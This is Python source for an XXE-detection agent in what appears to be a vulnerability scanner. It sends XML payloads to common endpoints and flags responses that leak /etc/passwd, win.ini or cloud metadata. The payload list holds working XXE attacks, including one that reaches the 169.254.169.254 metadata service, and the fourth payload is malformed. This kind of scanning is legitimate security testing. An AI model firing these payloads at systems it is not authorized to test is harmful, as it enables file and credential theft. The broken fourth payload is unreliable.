from __future__ import annotations

from bugfinder.agents.base import AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity
from bugfinder.utils.http import post


class XXEAgent(BaseAgent):
    category = "web"
    name = "xxe"

    async def execute(self) -> AgentResult:
        findings = []
        target = self.context.target
        base_url = f"{target.scheme}://{target.hostname}"
        if target.port:
            base_url += f":{target.port}"

        endpoints = ["/", "/api", "/api/v1", "/api/xml", "/xml", "/upload", "/soap"]
        content_types = ["application/xml", "text/xml", "application/soap+xml"]

        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>""",
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd" %param;]><root>&test;</root>""",
        ]

        for endpoint in endpoints:
            url = f"{base_url}{endpoint}"
            for ctype in content_types:
                for payload in xxe_payloads:
                    try:
                        resp = await post(url, content=payload, headers={"Content-Type": ctype}, timeout=10)
                        text = resp.text if hasattr(resp, "text") else ""
                        if "root:" in text or "[fonts]" in text or "ami-id" in text:
                            findings.append(
                                {
                                    "title": "XML External Entity (XXE) Injection",
                                    "description": f"Endpoint {endpoint} is vulnerable to XXE with content type {ctype}",
                                    "severity": Severity.CRITICAL,
                                    "confidence": Confidence.HIGH,
                                    "category": "xxe",
                                    "cwe_id": "611",
                                    "owasp_category": "A05-Security Misconfiguration",
                                    "cvss_score": 9.1,
                                    "evidence": {"endpoint": endpoint, "content_type": ctype},
                                    "remediation": "Disable XML external entity processing. Use less complex data formats like JSON. Configure XML parsers to not resolve external entities.",
                                }
                            )
                            break
                    except Exception:
                        pass

        return AgentResult(
            agent_name="xxe",
            status="completed",
            findings=findings,
            summary=f"Found {len(findings)} XXE vulnerabilities",
        )
